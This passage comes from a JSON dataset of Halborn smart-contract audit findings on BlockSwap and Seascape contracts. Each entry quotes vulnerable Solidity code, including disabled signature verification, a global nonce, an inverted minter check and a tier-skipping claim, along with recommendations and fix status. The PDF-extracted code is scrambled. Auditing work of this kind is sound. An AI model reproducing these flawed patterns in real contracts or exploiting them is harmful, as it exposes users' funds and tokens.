31 32 33 34 35 36 37 } BrandNFT.sol Listing 15: BrandNFT.sol brandCentral = BrandCentral ( _brandCentral ); 47 function init ( address _brandCentral ) external initializer { 48 49 50 51 } __ERC721_init ( \" StakeHouseBrand \" , \" SHNFT \"); skLOOT.sol Listing 16: skLOOT.sol lootFactory = _lootFactory ; 13 function init ( skLOOTFactory _lootFactory ) external initializer { 14 15 16 17 } __ERC721_init ( \" skLoot \" , \" skLoot \"); skLOOTFactory.sol Listing 17: skLOOTFactory.sol 128 function init ( BrandCentral _brandCentral , address _skLootLogic ) external initializer { brandCentral = _brandCentral ; __ERC721_init ( \" skLootBag \" , \" skLootBag \" ); 129 130 131 30 132 133 134 135 136 137 138 139 140 141 142 143 } StakeHouseUpgradeableProxy skLootProxy = new StakeHouseUpgradeableProxy ( _skLootLogic , address ( brandCentral . universe () ) , abi . encodeWithSelector ( skLOOT ( _skLootLogic ). init . selector , address ( this ) ) ); skLoot = skLOOT ( address ( skLootProxy )) ; StakeHouseUpgradeableProxy.sol Listing 18: StakeHouseUpgradeableProxy.sol 34 constructor ( address _logic , address universe_ , bytes memory _data ) payable ERC1967Proxy ( _logic , _data ) { _setUniverse ( universe_ ); 35 36 } UniverseUpgradeableProxy.sol Listing 19: UniverseUpgradeableProxy.sol 34 constructor ( address _logic , address accessControls_ , bytes memory _data ) payable ERC1967Proxy ( _logic , _data ) { _setAccessControls ( accessControls_ ); 35 36 } StakeHouseAccessControls.sol Listing 20: StakeHouseAccessControls.sol 37 constructor ( address _superAdmin ) { 38 39 _setRoleAdmin ( CORE_MODULE_ADMIN_ROLE , CORE_MODULE_ADMIN_ROLE ); _setRoleAdmin ( CORE_MODULE_MANAGER_ROLE , CORE_MODULE_ADMIN_ROLE ); 40 _setRoleAdmin ( CORE_MODULE_ROLE , CORE_MODULE_MANAGER_ROLE ); 31 41 42 43 44 45 } _setupRole ( DEFAULT_ADMIN_ROLE , _superAdmin ); _setupRole ( CORE_MODULE_ADMIN_ROLE , _superAdmin ); _setupRole ( CORE_MODULE_MANAGER_ROLE , _superAdmin ); StakeHouseUniverse.sol Listing 21: StakeHouseUniverse.sol StakeHouseAccessControls _accessControls , address _settlementPoolLogic , address _sETHBeacon , address _saveETHReservePoolLogic , address _saveETHLogic , address _stakeHouseRegistryBeacon , address _accountManagerLogic , address _transactionManagerLogic , address _depositRouter , uint256 _minDataEpochHeight 76 function init ( 77 78 79 80 81 82 83 84 85 86 87 ) external initializer { 88 89 { require ( _accessControls . isAdmin ( msg . sender ) , \" Only admin \" ) ; require ( _sETHBeacon != address (0) , \" sETH beacon cannot be zero address \" ); require ( _stakeHouseRegistryBeacon != address (0) , \" Registry beacon cannot be zero address \"); } accessControls = _accessControls ; StakeHouseUpgradeableProxy accountManagerProxy = new StakeHouseUpgradeableProxy ( _accountManagerLogic , address ( this ) , abi . encodeWithSelector ( AccountManager ( _accountManagerLogic ). init . selector , address ( this ) ) ); 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 32 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 accountManager = AccountManager ( address ( accountManagerProxy )); StakeHouseUpgradeableProxy transactionManagerProxy = new StakeHouseUpgradeableProxy ( _transactionManagerLogic , address ( this ) , abi . encodeWithSelector ( TransactionManager ( _transactionManagerLogic ). init . selector , address ( this ) , address ( accountManagerProxy ) , _depositRouter , _minDataEpochHeight ) ); transactionManager = TransactionManager ( address ( transactionManagerProxy )) ; StakeHouseUpgradeableProxy settlementProxy = new StakeHouseUpgradeableProxy ( _settlementPoolLogic , address ( this ) , abi . encodeWithSelector ( SlotSettlementPool ( _settlementPoolLogic ). init . selector , address ( this ) , _sETHBeacon ) ); slotSettlementPool = SlotSettlementPool ( address ( settlementProxy )) ; StakeHouseUpgradeableProxy saveETHReservePoolProxy = new StakeHouseUpgradeableProxy ( _saveETHReservePoolLogic , address ( this ) , abi . encodeWithSelector ( savETHReservePool ( _saveETHReservePoolLogic ). init . selector , address ( this ) , _saveETHLogic ) 33 141 142 143 144 145 146 147 ); saveETHPool = savETHReservePool ( address ( saveETHReservePoolProxy )) ; address _savETHManagerLogic = address ( new savETHManager () ); StakeHouseUpgradeableProxy saveETHManagerProxy = new ) ); StakeHouseUpgradeableProxy ( _savETHManagerLogic , address ( this ) , abi . encodeWithSelector ( savETHManager ( _savETHManagerLogic ). init . selector , address ( this ) 148 149 150 151 152 153 154 155 156 157 158 159 160 161 } 162 163 // / @dev Due to Solidity stack limitations on how many vars can be passed into a fn , this inits brand central separately savETHMan = savETHManager ( address ( saveETHManagerProxy )) ; stakeHouseRegistryBeacon = _stakeHouseRegistryBeacon ; emit CoreModulesInit () ; 164 // / @param _brandCentralLogic Logic contract for Brand Central 165 // / @param _brandNftLogic Logic contract for the brand NFT 166 // / @param _lootFactoryLogic Logic contract for skLootFactory 167 // / @param _skLootLogic Logic contract or skLoot NFT 168 // / @param _claimAuction Address of the Brand Central SHB auction contract 169 function superchargeAndInitBrandCentral ( address _brandCentralLogic , 170 address _brandNftLogic , 171 address _lootFactoryLogic , 172 address _skLootLogic , 173 174 address _claimAuction 175 ) external { 176 177 require ( accessControls . isAdmin ( msg . sender ) , \" Only admin \" ); require ( address ( brandCentral ) == address (0) , \" Only init once \" ) ; 178 179 StakeHouseUpgradeableProxy lootFactoryProxy = new 34 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 StakeHouseUpgradeableProxy ( address ( _lootFactoryLogic ) , address ( this ) , abi . encodePacked ( \" \") ); address _skLootFactory = address ( lootFactoryProxy ); StakeHouseUpgradeableProxy bNFTProxy = new StakeHouseUpgradeableProxy ( address ( _brandNftLogic ) , address ( this ) , abi . encodePacked ( \" \") ); address _brandNft = address ( bNFTProxy ); StakeHouseUpgradeableProxy brandCentralProxy = new StakeHouseUpgradeableProxy ( _brandCentralLogic , address ( this ) , abi . encodeWithSelector ( BrandCentral ( _brandCentralLogic ). init . selector , address ( this ) , _brandNft , _skLootFactory , _claimAuction ) ); address brandCentralAddress = address ( brandCentralProxy ); brandCentral = BrandCentral ( brandCentralAddress ); // init proxies BrandNFT ( _brandNft ). init ( brandCentralAddress ); skLOOTFactory ( _skLootFactory ). init ( brandCentral , _skLootLogic ) ; emit BrandCentralInit () ; 213 214 215 } 35 Risk Level: Likelihood - 3 Impact - 2 Recommendation: Add proper address validation when every state variable assignment is done from user supplied input. Remediation Plan: SOLVED: The BlockSwap team solved the issue by validating that every address input is different from zero. 36 ",
        "labels": [
            "Halborn",
            "BlockSwap",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF DEPRECATED SETUPROLE FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BlockSwap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Multiple contracts make use of the deprecated function _setupRole from the AccessControl contract. As per the AccessControl.sol contract documentation, this function is deprecated: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/ contracts/access/AccessControl.sol#L183 Code Location:  StakeHouseAccessControls.sol:42: _setupRole(DEFAULT_ADMIN_ROLE, _superAdmin);  StakeHouseAccessControls.sol:43: _setupRole(CORE_MODULE_ADMIN_ROLE , _superAdmin);  StakeHouseAccessControls.sol:44: _setupRole(CORE_MODULE_MANAGER_ROLE , _superAdmin);  StakeHouseAccessControls.sol:115: _address); _setupRole(CORE_MODULE_ROLE, Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use the _grantRole function instead. Remediation Plan: ACKNOWLEDGED: The BlockSwap team acknowledged this issue. 37 ",
        "labels": [
            "Halborn",
            "BlockSwap",
            "Severity: Informational"
        ]
    },
    {
        "title": "ACCOUNTMANAGER.GETACCOUNT VIEW FUNCTION CAN BE REMOVED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BlockSwap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract AccountManager there is the following public state variable declared: Listing 22: AccountManager.sol 27 Account [] public accounts ; At the same time, the contract contains the following view function: Listing 23: AccountManager.sol 46 function getAccount ( uint256 _index ) external view returns ( Account memory userAccount ) { require ( _index < accounts . length , ' The index requested does not exist '); userAccount = accounts [ _index ]; 47 48 49 50 } As accounts is already declared as a public state variable the compiler already creates a view function to access and read each of the elements of the array, hence is not needed to declare an extra view function. Risk Level: Likelihood - 1 Impact - 1 38 Recommendation: It is recommended either to declare accounts state variable as private keeping the new view function or to keep the accounts state variable as public and remove the new view function. Remediation Plan: ACKNOWLEDGED: The BlockSwap team acknowledged this issue. 39 ",
        "labels": [
            "Halborn",
            "BlockSwap",
            "Severity: Informational"
        ]
    },
    {
        "title": "TRANSACTIONMANAGER.GETWITHDRAWALADDRESS VIEW FUNCTION CAN BE REMOVED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BlockSwap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract TransactionManager the following public state variable is declared: Listing 24: TransactionManager.sol 15 AccountManager public accountManager ; At the same time, the contract contains the following view function: Listing 25: TransactionManager.sol 123 function getWithdrawalAddress () external view returns ( address ) { 124 125 } return address ( accountManager ); As accountManager is already declared as a public state variable the compiler already creates a view function to read it, hence is not needed to declare an extra view function. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended either to declare accountManager state variable as private keeping the new view function or to keep the accountManager state 40 variable as public and remove the new view function. Remediation Plan: ACKNOWLEDGED: BlockSwap team acknowledged this issue. 41 ",
        "labels": [
            "Halborn",
            "BlockSwap",
            "Severity: Informational"
        ]
    },
    {
        "title": "CONSTANT KECCAK VARIABLES ARE TREATED AS EXPRESSIONS, NOT CONSTANTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BlockSwap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract StakeHouseAccessControls, the roles are declared the following way: Listing 26: StakeHouseAccessControls.sol 11 bytes32 public constant PROXY_ADMIN_ROLE = keccak256 ( \" PROXY_ADMIN_ROLE \"); 12 bytes32 public constant CORE_MODULE_ADMIN_ROLE = keccak256 ( \" CORE_MODULE_ADMIN_ROLE \" ); 13 bytes32 public constant CORE_MODULE_MANAGER_ROLE = keccak256 (\" CORE_MODULE_MANAGER_ROLE \"); 14 bytes32 public constant CORE_MODULE_ROLE = keccak256 ( \" CORE_MODULE_ROLE \"); This results in the keccak256 operation being performed whenever the variable is used, increasing gas costs relative to just storing the output hash.  Each usage of a constant costs ~100gas more per access (still a little better than storing the result in storage, but not by much).  Since these are not real constants, they cant be referenced from a real constant environment (e.g., from assembly, or from another library). Risk Level: Likelihood - 1 Impact - 1 42 Recommendation: It is recommended to either: 1. Keep the variables as constant and hard-code the bytes32 string into the smart contracts. 2. Declare all the roles as immutable and perform the hashing assignment in the constructors. Remediation Plan: SOLVED: The BlockSwap team solved the issue by adding the immutable modifier to the state variables mentioned, and they are now initialized in the constructor. 43 3.10 (HAL-10) USING ++I CONSUMES LESS GAS THAN I++ IN LOOPS - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "BlockSwap",
            "Severity: Informational"
        ]
    },
    {
        "title": "SIGNATURE NONCES ARE IMPLEMENTED INCORRECTLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Moonscape_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the MoonscapeDefi and StakeNftForChain contracts, a nonce state variable is used to prevent signature replay attacks: Listing 1: MoonscapeDefi.sol 23 uint256 public nonce ; Listing 2: MoonscapeDefi.sol (Lines 146,153,163) 132 function stakeToken ( uint _stakeId , uint _cityId , uint  _buildingId , uint _amount , uint8 v , bytes32 [2] calldata sig )  external { 133  ]; 134 135 136 137 TokenStaking storage tokenStaking = tokenStakings [ _stakeId // todo // validate the session id bytes32 stakeKey = stakeKeyOf ( tokenStaking . sessionId ,  _stakeId ); 138 139 140 141 142 143 144 145 require ( isActive ( stakeKey ) , \" session not active \" ); // validate stake id require ( _stakeId <= stakeId ,\" do not have this stakeId \" ); { bytes memory prefix = \" \\ x19Ethereum Signed Message  :\\ n32 \" ; 146 bytes32 message = keccak256 ( abi . encodePacked (  _stakeId , tokenStaking . sessionId , _cityId , _buildingId , nonce , msg  . sender )); 147 bytes32 hash = keccak256 ( abi . encodePacked (  prefix , message )); 148 address recover = ecrecover ( hash , v , sig [0] ,  sig [1]) ; 149 14 150 // require ( recover == verifier , \" Verification failed  about stakeToken \") ; } 151 152 153 154 155 156 157 158 159 ++ nonce ; deposit ( stakeKey , msg . sender , _amount ); IERC20 token = IERC20 ( tokenStaking . stakeToken ); require ( token . balanceOf ( msg . sender ) >= _amount , \" Not  enough token to stake \" ); 160 161  ; 162 163 token . safeTransferFrom ( msg . sender , address ( this ) , _amount ) emit StakeToken ( msg . sender , tokenStaking . sessionId ,  _stakeId , _cityId , _buildingId , _amount , nonce ); 164 } Listing 3: MoonscapeDefi.sol (Lines 195,202) 180 function importNft ( uint _stakeId , uint _cityId , uint  _buildingId , uint _scapeNftId , uint8 _v , bytes32 [2] calldata sig )  external { 181  ]; 182 183 184 TokenStaking storage tokenStaking = tokenStakings [ _stakeId // validate the session id bytes32 stakeKey = stakeKeyOf ( tokenStaking . sessionId ,  _stakeId ); 185 186 187 188 189 190 191 require ( isActive ( stakeKey ) , \" session not active \" ); // validate stake id require ( _stakeId <= stakeId , \" do not have this stakeId \" ); require ( nft . ownerOf ( _scapeNftId ) == msg . sender , \" not owned  \" ); 192 193 194  :\\ n32 \" ; { bytes memory prefix = \" \\ x19Ethereum Signed Message 15 195 bytes32 message = keccak256 ( abi . encodePacked (  tokenStaking . sessionId , _stakeId , _cityId , _buildingId ,  _scapeNftId , nonce , msg . sender )) ; 196 bytes32 hash = keccak256 ( abi . encodePacked (  prefix , message )); 197 address recover = ecrecover ( hash , _v , sig [0] ,  sig [1]) ; 198 199 // require ( recover == verifier , \" Verification failed  about stakeNft \") ; 200 201 202 203 204 } ++ nonce ; nft . safeTransferFrom ( msg . sender , 0  x000000000000000000000000000000000000dEaD , _scapeNftId ); 205 206 emit ImportNft ( msg . sender , tokenStaking . sessionId ,  _stakeId , _cityId , _buildingId , _scapeNftId , block . timestamp ); 207 208 } Listing 4: MoonscapeDefi.sol (Lines 251,258) 243 function verifyBonus ( uint _sessionId , uint _stakeId , uint  _cityId , uint _buildingId , uint _bonusPercent , uint8 _v , bytes32  _r , bytes32 _s ) internal returns ( bool ) { 244 245 246 247 bytes32 stakeKey = stakeKeyOf ( _sessionId , _stakeId ); require ( receiveBonus [ stakeKey ][ msg . sender ] == false , \"  already rewarded \" ); 248 249 250  :\\ n32 \" ; { bytes memory prefix = \" \\ x19Ethereum Signed Message 251 bytes32 message = keccak256 ( abi . encodePacked (  _sessionId , _stakeId , _cityId , _buildingId , _bonusPercent , nonce ,  msg . sender )); 252 bytes32 hash = keccak256 ( abi . encodePacked (  prefix , message )); 253 254 address recover = ecrecover ( hash , _v , _r , _s ); 16 255 // require ( recover == verifier , \" Verification failed  about getBonus \") ; 256 257 258 259 260 261 } ++ nonce ; return true ; } Listing 5: StakeNftForChain.sol (Line 65) { bytes32 message bytes memory prefix = keccak256 ( abi . encodePacked ( = \" \\ x19Ethereum Signed Message require ( isActive ( sessionId ) , \" session not active \" ); function importNft ( uint _stakeId , uint _cityId , uint require ( nft . ownerOf ( _scapeNftId ) == msg . sender , \" not owner 50  _buildingId , uint _scapeNftId , uint8 _v , bytes32 [2] calldata sig )  external { 51 52 53 54  \" ); 55 56 57  :\\ n32 \" ; 58  sessionId , _stakeId , _cityId , _buildingId , _scapeNftId , nonce , msg  . sender )); 59  prefix , message )); 60  sig [1]) ; 61 62  about stakeNft \") ; 63 64 65 66 67  x000000000000000000000000000000000000dEaD , _scapeNftId ); 68 69  _buildingId , _scapeNftId , block . timestamp ); 70 emit ImportNft ( msg . sender , sessionId , _stakeId , _cityId , // require ( recover == verifier , \" Verification failed nft . safeTransferFrom ( msg . sender , 0 = keccak256 ( abi . encodePacked ( = ecrecover ( hash , _v , sig [0] , address recover bytes32 hash ++ nonce ; } } 17 This nonce variable is increased when stakeToken(), importNft() or verifyBonus() functions are called. Although, the signer does not really know the order in which the users will call these functions. Hence, if the backend, for example, generates a signature for a user and this user does not call the function right after that, his signature will be invalid after someone else calls any of those functions. Risk Level: Likelihood - 5 Impact - 2 Recommendation: It is recommended to use a mapping instead of a global counter as a nonce to solve this issue: mapping(address => uint256)public _nonces; Remediation Plan: SOLVED: The SeaScape Team now uses a nonce mapping for each user. This issue were fixed in the commit ID cdc174452dae98665bfda883dca9c7ee46dda50f 18 ",
        "labels": [
            "Halborn",
            "Seascape_Moonscape",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING SIGNATURE VERIFICATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Moonscape_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the MoonscapeDefi and StakeNftForChain contracts, some functions use the ecrecover() function when staking or importing NFTs or calculating This ecrecover() function is a handy Solidity function that bonuses. allows the smart contract to validate that an expected party properly signs incoming data. The mentioned functions use the ecrecover() but there is no validation of the obtained address by this function. Listing 6: MoonscapeDefi.sol (Line 150) 132 function stakeToken ( uint _stakeId , uint _cityId , uint  _buildingId , uint _amount , uint8 v , bytes32 [2] calldata sig )  external { 133  ]; 134 135 136 137 TokenStaking storage tokenStaking = tokenStakings [ _stakeId // todo // validate the session id bytes32 stakeKey = stakeKeyOf ( tokenStaking . sessionId ,  _stakeId ); 138 139 140 141 142 143 144 145 require ( isActive ( stakeKey ) , \" session not active \" ); // validate stake id require ( _stakeId <= stakeId ,\" do not have this stakeId \" ); { bytes memory prefix = \" \\ x19Ethereum Signed Message  :\\ n32 \" ; 146 bytes32 message = keccak256 ( abi . encodePacked (  _stakeId , tokenStaking . sessionId , _cityId , _buildingId , nonce , msg  . sender )); 147 bytes32 hash = keccak256 ( abi . encodePacked (  prefix , message )); 148 address recover = ecrecover ( hash , v , sig [0] , 19  sig [1]) ; 149 150 // require ( recover == verifier , \" Verification failed  about stakeToken \") ; } 151 152 153 154 155 156 157 158 159 ++ nonce ; deposit ( stakeKey , msg . sender , _amount ); IERC20 token = IERC20 ( tokenStaking . stakeToken ); require ( token . balanceOf ( msg . sender ) >= _amount , \" Not  enough token to stake \" ); 160 161  ; 162 163 token . safeTransferFrom ( msg . sender , address ( this ) , _amount ) emit StakeToken ( msg . sender , tokenStaking . sessionId ,  _stakeId , _cityId , _buildingId , _amount , nonce ); 164 } Listing 7: MoonscapeDefi.sol (Line 199) 180 function importNft ( uint _stakeId , uint _cityId , uint  _buildingId , uint _scapeNftId , uint8 _v , bytes32 [2] calldata sig )  external { 181  ]; 182 183 184 TokenStaking storage tokenStaking = tokenStakings [ _stakeId // validate the session id bytes32 stakeKey = stakeKeyOf ( tokenStaking . sessionId ,  _stakeId ); 185 186 187 188 189 190 191 require ( isActive ( stakeKey ) , \" session not active \" ); // validate stake id require ( _stakeId <= stakeId , \" do not have this stakeId \" ); require ( nft . ownerOf ( _scapeNftId ) == msg . sender , \" not owned  \" ); 192 193 194 { bytes memory prefix = \" \\ x19Ethereum Signed Message 20  :\\ n32 \" ; 195 bytes32 message = keccak256 ( abi . encodePacked (  tokenStaking . sessionId , _stakeId , _cityId , _buildingId ,  _scapeNftId , nonce , msg . sender )) ; 196 bytes32 hash = keccak256 ( abi . encodePacked (  prefix , message )); 197 address recover = ecrecover ( hash , _v , sig [0] ,  sig [1]) ; 198 199 // require ( recover == verifier , \" Verification failed  about stakeNft \") ; 200 201 202 203 204 } ++ nonce ; nft . safeTransferFrom ( msg . sender , 0  x000000000000000000000000000000000000dEaD , _scapeNftId ); 205 206 emit ImportNft ( msg . sender , tokenStaking . sessionId ,  _stakeId , _cityId , _buildingId , _scapeNftId , block . timestamp ); 207 208 } Listing 8: MoonscapeDefi.sol (Line 255) 243 function verifyBonus ( uint _sessionId , uint _stakeId , uint  _cityId , uint _buildingId , uint _bonusPercent , uint8 _v , bytes32  _r , bytes32 _s ) internal returns ( bool ) { 244 245 246 247 bytes32 stakeKey = stakeKeyOf ( _sessionId , _stakeId ); require ( receiveBonus [ stakeKey ][ msg . sender ] == false , \"  already rewarded \" ); 248 249 250  :\\ n32 \" ; { bytes memory prefix = \" \\ x19Ethereum Signed Message 251 bytes32 message = keccak256 ( abi . encodePacked (  _sessionId , _stakeId , _cityId , _buildingId , _bonusPercent , nonce ,  msg . sender )); 252 bytes32 hash = keccak256 ( abi . encodePacked (  prefix , message )); 253 254 address recover = ecrecover ( hash , _v , _r , _s ); 21 255 // require ( recover == verifier , \" Verification failed  about getBonus \") ; 256 257 258 259 260 261 } ++ nonce ; return true ; } Listing 9: StakeNftForChain.sol (Line 65) { bytes32 message bytes memory prefix = keccak256 ( abi . encodePacked ( = \" \\ x19Ethereum Signed Message require ( isActive ( sessionId ) , \" session not active \" ); function importNft ( uint _stakeId , uint _cityId , uint require ( nft . ownerOf ( _scapeNftId ) == msg . sender , \" not owner 50  _buildingId , uint _scapeNftId , uint8 _v , bytes32 [2] calldata sig )  external { 51 52 53 54  \" ); 55 56 57  :\\ n32 \" ; 58  sessionId , _stakeId , _cityId , _buildingId , _scapeNftId , nonce , msg  . sender )); 59  prefix , message )); 60  sig [1]) ; 61 62  about stakeNft \") ; 63 64 65 66 67  x000000000000000000000000000000000000dEaD , _scapeNftId ); 68 69  _buildingId , _scapeNftId , block . timestamp ); 70 emit ImportNft ( msg . sender , sessionId , _stakeId , _cityId , // require ( recover == verifier , \" Verification failed nft . safeTransferFrom ( msg . sender , 0 = keccak256 ( abi . encodePacked ( = ecrecover ( hash , _v , sig [0] , address recover bytes32 hash ++ nonce ; } } 22 Risk Level: Likelihood - 2 Impact - 5 Recommendation: It is recommended to validate the recovered address with the one allowed to execute the called function. Remediation Plan: SOLVED: The SeaScape Team corrected the recovered address verification. This issue were fixed in the commit ID cdc174452dae98665bfda883dca9c7ee46dda50f 23 ",
        "labels": [
            "Halborn",
            "Seascape_Moonscape",
            "Severity: Medium"
        ]
    },
    {
        "title": "MINTERS CANT BE UNSET",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Moonscape_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The unsetMinter() function from RoverNft.sol smart contract does not correctly implement the verification to check if an account is a minter. This statement prevents minters from being removed. Code Location: Listing 10: Rover.Nft.sol (Line 46) 45 46 47 48 49 50 51 function unsetMinter ( address _minter ) public onlyOwner { require (! minters [ _minter ], \" already a minter \" ); delete minters [ _minter ]; emit UnsetMinter ( _minter ); } Proof of Concept: Steps to replicate this issue: - add a minter, for example user1 - try to remove user1 from minters Listing 11: RoverTest.js 1 2 3 4 it (\" ROVER :: unset minters \" , async () = > { await rover . setMinter ( user1 . address ); await rover . unsetMinter ( user1 . address ); }) ; 24 Listing 12: Output ROVER :: unset minters : 1 2  with reason string ' already a minter ' 3 at RoverNft . unsetMinter ( contracts / nfts / RoverNft . sol :46) Error : VM Exception while processing transaction : reverted Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to correctly validate if the user is a minter before removing it. Remediation Plan: SOLVED: The SeaScape Team corrected the verification to determine whether an account is a minter or not. This issue were fixed in the commit ID cdc174452dae98665bfda883dca9c7ee46dda50f 25 ",
        "labels": [
            "Halborn",
            "Seascape_Moonscape",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNUSED PARAMETERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Moonscape_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There are functions whose parameters are never used in some smart contracts. These parameters do not affect the code. Code Location:  operator, from, tokenId, data (MoonscapeDefi.sol#393,394,395,396)  operator, from, tokenId, data (MoonscapeGame.sol#275,276,277.278)  operator, from, tokenId, data (StakeNftForChain.sol#98)  amount (MMscpToken.sol#95) Risk Level: Likelihood - 1 Impact - 2 Recommendation: All parameters given to a function should affect the state of the code. The operator, from, tokenId, and data from onERC721Received() functions should implement any logic with that parameters, but they are not used for any contract state operations. Remediation Plan: ACKNOWLEDGED: The SeaScape Team acknowledged this finding. 26 ",
        "labels": [
            "Halborn",
            "Seascape_Moonscape",
            "Severity: Informational"
        ]
    },
    {
        "title": "FUNCTION STATE CAN BE RESTRICTED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Moonscape_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The state mutability of some functions could be restricted to pure in order to save gas. Code Location: Listing 13: MoonscapeDefi.sol 367 function stakeKeyOf ( uint _sessionId , uint _stakeId ) public  virtual returns ( bytes32 ) { 368 369 } return keccak256 ( abi . encodePacked ( _sessionId , _stakeId )) ; Listing 14: MscpVesting.sol 140 141 142 143 144 145 146 147 148 function getAvailableTokens ( bool _strategicInvestor , uint256 _timePassed , uint256 _remainingCoins ) { internal view returns ( uint ) Listing 15: MscpVesting.sol 161 function getBonus ( bool _strategicInvestor ) internal view  returns ( uint ) { 162 163  one 164 165 } if ( _strategicInvestor ) return 2000000 * 10**18; // 2 mil is released on day return 1500000 * 10**18; // 1.5 mil is released on day one 27 Listing 16: MscpToken.sol 95 96 97 function burn ( uint256 amount ) public { require ( false , \" Only burnFrom is allowed \" ); } Risk Level: Likelihood - 2 Impact - 1 Recommendation: It is recommended to restrict the state of the mentioned functions to pure. Remediation Plan: ACKNOWLEDGED: The SeaScape Team acknowledged this finding. 28 ",
        "labels": [
            "Halborn",
            "Seascape_Moonscape",
            "Severity: Informational"
        ]
    },
    {
        "title": "PRAGMA VERSION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Moonscape_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The moonScape smart contracts use the pragma version 0.6.7 released on May 4, 2020. latest pragma version 0.8.16 released on August 8, 2022, solves different issues. It is also noticeable that Solidity versions after 0.8.0 also implement default overflow protection on arithmetic operations. Reference: Solidity Releases Code Location: note: All moonScape smart contracts implement same pragma version. Listing 17: MoonscapeGame.sol 1 pragma solidity 0.6.7; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Updating the pragma version used in MoonScape smart contracts is recommended to versions above or equal to 0.8.0. Remediation Plan: ACKNOWLEDGED: The SeaScape Team acknowledged this finding. 29 ",
        "labels": [
            "Halborn",
            "Seascape_Moonscape",
            "Severity: Informational"
        ]
    },
    {
        "title": "CLAIM CAN SKIP LEVEL ZERO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Claim on LighthouseTier can skip claim for level 0 if the given level signature containing a level 1 is valid. Code Location: Listing 1: contracts/LighthouseTier (Lines 121,124) 116 function claim ( uint8 level , uint8 v , bytes32 r , bytes32 s ) external { require ( level >= 0 && level < 4, INVALID_PARAMETER \"); Tier storage tier = tiers [ msg . sender ]; \" LighthouseTier : // You can 't Skip tiers . if ( level != 0) { require ( tier . level + 1 == level , LighthouseTier : INVALID_LEVEL \" ); } else { require ( tier . usable == false , LighhouseTier : 0 _CLAIMED \"); } \" \" 117 118 119 120 121 122 123 124 125 13 Risk Level: Likelihood - 5 Impact - 5 Recommendations: It is recommended to check if the usability is set (tier.usable) when the level is different than 0. This will prevent the tier.level + 1 == level check to pass when level zero has not yet been claimed. Remediation Plan: wrapper SOLVED: Since the contract was already deployed on the mainnet, named new LighthouseTierWrapper solved the issue. Seascape team fixed the issue in commit ef9a08c2c5f9b4a2e2c92f562daf1000c9f99199. contract, contract written. This was new 14 ",
        "labels": [
            "Halborn",
            "Seascape_Lighthouse",
            "Severity: Critical"
        ]
    },
    {
        "title": "CONTRACT LOCKED WHEN TRANSFERRING PRE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Calling transferPrefund on LighthouseProject to a project id whose prefund stage is not finished would set the internal transferredPrefund field to true, preventing the function to be called again. Furthermore, this method can be called with a none existing project id, locking the posibility to call transferPrefund for a future created project. Code Location: Listing 2: contracts/LighthouseProject (Lines 230,257) } return ; if ( auctions [ id ]. transferredPrefund ) { 229 function transferPrefund ( uint256 id ) external onlyOwner { 230 231 232 233 234 235 236 237 238 239 uint256 cap ; uint256 amount ; ( cap , amount ) = prefundTotalPool ( id ); if ( amount < cap ) { // We apply SCALER multiplayer , if the cap is less than 100 240 241 // It could happen if investing goes in NATIVE token . uint256 scaledPercent = ( cap - amount ) * SCALER / ( cap * 15 SCALER / 100) ; // allocation = 10 * SCALER / 100 * SCALED percent ; uint256 scaledTransferAmount = ( prefunds [ id ]. scaledAllocation * scaledPercent / 100) / SCALER ; auctions [ id ]. scaledAllocation = auctions [ id ]. scaledAllocation + scaledTransferAmount ; prefunds [ id ]. scaledAllocation = prefunds [ id ]. scaledAllocation - scaledTransferAmount ; uint256 scaledCompensationAmount = ( prefunds [ id ]. scaledCompensation * scaledPercent / 100) / SCALER ; auctions [ id ]. scaledCompensation = auctions [ id ]. scaledCompensation + scaledCompensationAmount ; prefunds [ id ]. scaledCompensation = prefunds [ id ]. scaledCompensation - 